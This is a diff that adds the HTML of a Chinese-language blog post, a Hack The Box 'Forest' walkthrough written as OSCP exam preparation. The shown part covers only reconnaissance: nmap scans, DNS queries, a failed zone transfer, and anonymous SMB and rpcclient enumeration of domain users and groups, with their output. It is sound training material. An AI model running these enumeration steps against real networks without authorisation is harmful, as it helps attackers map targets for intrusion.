@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="ForestBox info  Reconnmap1nmap -sT -sC -sV -O -p 53,135,139,389,445,593,3268,47001 10.10.10.161  1234567891011121314151617181920212223242526272829303132333435363738394041424344Nmap scan report for 10.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Road-to-OSCP-4-Forest">
+<meta property="og:url" content="http://example.com/undefined/a7f75ca4.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="ForestBox info  Reconnmap1nmap -sT -sC -sV -O -p 53,135,139,389,445,593,3268,47001 10.10.10.161  1234567891011121314151617181920212223242526272829303132333435363738394041424344Nmap scan report for 10.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230312205222691.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230312212800728.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230312213156062.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230312213327732.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230312213915439.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230312214603499.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230312214801416.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230312215108184.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230312215522843.png">
+<meta property="article:published_time" content="2023-03-12T14:02:28.000Z">
+<meta property="article:modified_time" content="2023-03-12T14:11:13.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="OSCP备考">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/undefined/undefined/image-20230312205222691.png">
+
+<link rel="canonical" href="http://example.com/undefined/a7f75ca4.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Road-to-OSCP-4-Forest | So1Lupus</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">So1Lupus</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">So1Lupus</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/a7f75ca4.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="So1Lupus">
+      <meta itemprop="description" content="So1Lupus的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="So1Lupus">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Road-to-OSCP-4-Forest
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-12 22:02:28 / 修改时间：22:11:13" itemprop="dateCreated datePublished" datetime="2023-03-12T22:02:28+08:00">2023-03-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Forest"><a href="#Forest" class="headerlink" title="Forest"></a>Forest</h1><h2 id="Box-info"><a href="#Box-info" class="headerlink" title="Box info"></a>Box info</h2><img src="/undefined/undefined/image-20230312205222691.png" class="">
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sC -sV -O -p 53,135,139,389,445,593,3268,47001 10.10.10.161</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.10.161</span><br><span class="line">Host is up (0.56s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Simple DNS Plus</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows 10 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2023-03-12T10:51:55</span><br><span class="line">|_  start_date: 2023-03-12T08:42:45</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: FOREST</span><br><span class="line">|   NetBIOS computer name: FOREST\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: FOREST.htb.local</span><br><span class="line">|_  System time: 2023-03-12T03:51:56-07:00</span><br><span class="line">|_clock-skew: mean: 2h26m48s, deviation: 4h02m31s, median: 6m47s</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sun Mar 12 18:45:31 2023 -- 1 IP address (1 host up) scanned in 58.26 seconds</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sC -sV -O -p53,123,389 10.10.10.161</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> Nmap 7.93 scan initiated Sun Mar 12 18:37:38 2023 as: nmap -sU -sC -sV -O -p53,123,389 -oN udp 10.10.10.161</span><br><span class="line">Nmap scan report for 10.10.10.161</span><br><span class="line">Host is up (0.56s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">53/udp  open  domain  (generic dns response: SERVFAIL)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NBTStat: </span><br><span class="line">|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">123/udp open  ntp     NTP v3</span><br><span class="line">| ntp-info: </span><br><span class="line">|_  </span><br><span class="line">389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port53-UDP:V=7.93%I=7%D=3/12%Time=640DAB92%P=x86_64-pc-linux-gnu%r(NBTS</span><br><span class="line">SF:tat,32,&quot;\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">SF:AAAAAAA\0\0!\0\x01&quot;);</span><br><span class="line">Too many fingerprints match this host to give specific OS details</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 6m51s</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sun Mar 12 18:38:29 2023 -- 1 IP address (1 host up) scanned in 51.65 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ dig htb.local @10.10.10.161     </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.8-1-Debian &lt;&lt;&gt;&gt; htb.local @10.10.10.161</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; WARNING: .local is reserved for Multicast DNS</span><br><span class="line">;; You are currently testing what happens when an mDNS query is leaked to DNS</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24459</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="line">; COOKIE: 2283a32ea95ada22 (echoed)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;htb.local.                     IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">htb.local.              600     IN      A       10.10.10.161</span><br><span class="line"></span><br><span class="line">;; Query time: 319 msec</span><br><span class="line">;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)</span><br><span class="line">;; WHEN: Sun Mar 12 21:00:24 CST 2023</span><br><span class="line">;; MSG SIZE  rcvd: 66</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ dig forest.htb.local @10.10.10.161</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.8-1-Debian &lt;&lt;&gt;&gt; forest.htb.local @10.10.10.161</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; WARNING: .local is reserved for Multicast DNS</span><br><span class="line">;; You are currently testing what happens when an mDNS query is leaked to DNS</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9562</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="line">; COOKIE: 03db0d79ded5c060 (echoed)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;forest.htb.local.              IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">forest.htb.local.       3600    IN      A       10.10.10.161</span><br><span class="line"></span><br><span class="line">;; Query time: 303 msec</span><br><span class="line">;; SERVER: 10.10.10.161#53(10.10.10.161) (UDP)</span><br><span class="line">;; WHEN: Sun Mar 12 21:01:28 CST 2023</span><br><span class="line">;; MSG SIZE  rcvd: 73</span><br></pre></td></tr></table></figure>
+
+<p>​	It’s doesn’t let me do a zone transfer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ dig axfr htb.local @10.10.10.161  </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.8-1-Debian &lt;&lt;&gt;&gt; axfr htb.local @10.10.10.161</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.              </span><br></pre></td></tr></table></figure>
+
+<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>​	port 139 is open ,try smb connection.Howerver,it doesn’t work.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L //10.10.10.161/</span><br><span class="line"></span><br><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ smbclient -N -L //htb.local/                        </span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to htb.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>
+
+<h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>​	port 135 is open,try rpcclient.And find it’s work.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="line">└─$ rpcclient -U &quot;&quot; -N 10.10.10.161</span><br><span class="line">rpcclient $&gt; </span><br></pre></td></tr></table></figure>
+
+<p>​	Then we can use it to enumrate users,groups,member of group.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; enumdomusers              </span><br><span class="line">user:[Administrator] rid:[0x1f4]       </span><br><span class="line">user:[Guest] rid:[0x1f5]               </span><br><span class="line">user:[krbtgt] rid:[0x1f6]              </span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]      </span><br><span class="line">user:[$331000-VK4ADACQNUCA] rid:[0x463]</span><br><span class="line">user:[SM_2c8eef0a09b545acb] rid:[0x464]</span><br><span class="line">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]</span><br><span class="line">user:[SM_75a538d3025e4db9a] rid:[0x466]</span><br><span class="line">user:[SM_681f53d4942840e18] rid:[0x467]</span><br><span class="line">user:[SM_1b41c9286325456bb] rid:[0x468]</span><br><span class="line">user:[SM_9b69f1b9d2cc45549] rid:[0x469]</span><br><span class="line">user:[SM_7c96b981967141ebb] rid:[0x46a]</span><br><span class="line">user:[SM_c75ee099d0a64c91b] rid:[0x46b]</span><br><span class="line">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]</span><br><span class="line">user:[HealthMailboxc3d7722] rid:[0x46e]</span><br><span class="line">user:[HealthMailboxfc9daad] rid:[0x46f]</span><br><span class="line">user:[HealthMailboxc0a90c9] rid:[0x470]</span><br><span class="line">user:[HealthMailbox670628e] rid:[0x471]</span><br><span class="line">user:[HealthMailbox968e74d] rid:[0x472]</span><br><span class="line">user:[HealthMailbox6ded678] rid:[0x473]</span><br><span class="line">user:[HealthMailbox83d6781] rid:[0x474]</span><br><span class="line">user:[HealthMailboxfd87238] rid:[0x475]</span><br><span class="line">user:[HealthMailboxb01ac64] rid:[0x476]</span><br><span class="line">user:[HealthMailbox7108a4e] rid:[0x477]</span><br><span class="line">user:[HealthMailbox0659cc1] rid:[0x478]</span><br><span class="line">user:[sebastien] rid:[0x479]</span><br><span class="line">user:[lucinda] rid:[0x47a]</span><br><span class="line">user:[svc-alfresco] rid:[0x47b]  </span><br><span class="line">user:[andy] rid:[0x47e]                </span><br><span class="line">user:[mark] rid:[0x47f]                </span><br><span class="line">user:[santi] rid:[0x480]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; enumdomgroups</span><br><span class="line">group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]          </span><br><span class="line">group:[Domain Admins] rid:[0x200]</span><br><span class="line">group:[Domain Users] rid:[0x201]</span><br><span class="line">group:[Domain Guests] rid:[0x202]</span><br><span class="line">group:[Domain Computers] rid:[0x203]</span><br><span class="line">group:[Domain Controllers] rid:[0x204]</span><br><span class="line">group:[Schema Admins] rid:[0x206]</span><br><span class="line">group:[Enterprise Admins] rid:[0x207]</span><br><span class="line">group:[Group Policy Creator Owners] rid:[0x208]</span><br><span class="line">group:[Read-only Domain Controllers] rid:[0x209]</span><br><span class="line">group:[Cloneable Domain Controllers] rid:[0x20a]</span><br><span class="line">group:[Protected Users] rid:[0x20d]</span><br><span class="line">group:[Key Admins] rid:[0x20e]            </span><br><span class="line">group:[Enterprise Key Admins] rid:[0x20f]</span><br><span class="line">group:[DnsUpdateProxy] rid:[0x44e]</span><br><span class="line">group:[Organization Management] rid:[0x450]</span><br><span class="line">group:[Recipient Management] rid:[0x451]                 </span><br><span class="line">group:[View-Only Organization Management] rid:[0x452]</span><br><span class="line">group:[Public Folder Management] rid:[0x453]</span><br><span class="line">group:[UM Management] rid:[0x454]</span><br><span class="line">group:[Help Desk] rid:[0x455]</span><br><span class="line">group:[Records Management] rid:[0x456]</span><br><span class="line">group:[Discovery Management] rid:[0x457]</span><br><span class="line">group:[Server Management] rid:[0x458]</span><br><span class="line">group:[Delegated Setup] rid:[0x459]</span><br><span class="line">group:[Hygiene Management] rid:[0x45a]</span><br><span class="line">group:[Compliance Management] rid:[0x45b]</span><br><span class="line">group:[Security Reader] rid:[0x45c]</span><br><span class="line">group:[Security Administrator] rid:[0x45d]</span><br><span class="line">group:[Exchange Servers] rid:[0x45e]</span><br><span class="line">group:[Exchange Trusted Subsystem] rid:[0x45f]</span><br><span class="line">group:[Managed Availability Servers] rid:[0x460]</span><br><span class="line">group:[Exchange Windows Permissions] rid:[0x461]</span><br><span class="line">group:[ExchangeLegacyInterop] rid:[0x462]</span><br><span class="line">group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]</span><br><span class="line">group:[Service Accounts] rid:[0x47c]</span><br><span class="line">group:[Privileged IT Accounts] rid:[0x47d]</span><br><span class="line">group:[test] rid:[0x13ed]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; querygroup 0x200          </span><br><span class="line">        Group Name:     Domain Admins     </span><br><span class="line">        Description:    Designated administrators of the domain</span><br><span class="line">        Group Attribute:7              </span><br><span class="line">        Num Members:1                  </span><br><span class="line">rpcclient $&gt; querygroupmem 0x200</span><br><span class="line">        rid:[0x1f4] attr:[0x7]</span><br></pre></td></tr></table></figure>
+
